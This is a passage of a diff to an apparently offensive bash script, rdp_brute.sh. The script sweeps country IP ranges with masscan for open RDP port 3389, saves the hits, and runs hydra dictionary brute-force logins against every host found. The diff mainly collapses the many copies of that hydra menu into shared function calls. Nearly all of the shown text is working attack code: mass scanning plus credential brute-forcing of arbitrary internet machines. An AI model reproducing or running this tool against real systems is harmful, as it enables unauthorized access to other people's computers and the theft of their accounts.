-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19576,6 +7954,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19585,53 +7964,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19649,6 +7982,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19658,53 +7992,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19722,6 +8010,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19731,53 +8020,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19795,6 +8038,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19804,53 +8048,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19868,6 +8066,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19877,53 +8076,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -19941,6 +8094,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -19950,53 +8104,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20014,6 +8122,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20023,53 +8132,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20087,6 +8150,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20096,53 +8160,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20160,6 +8178,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20169,53 +8188,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20233,6 +8206,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20242,53 +8216,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20306,6 +8234,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20315,53 +8244,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20379,6 +8262,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20388,53 +8272,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "64" ]; then
@@ -20451,6 +8289,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20460,53 +8299,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -20524,6 +8317,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -20533,53 +8327,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
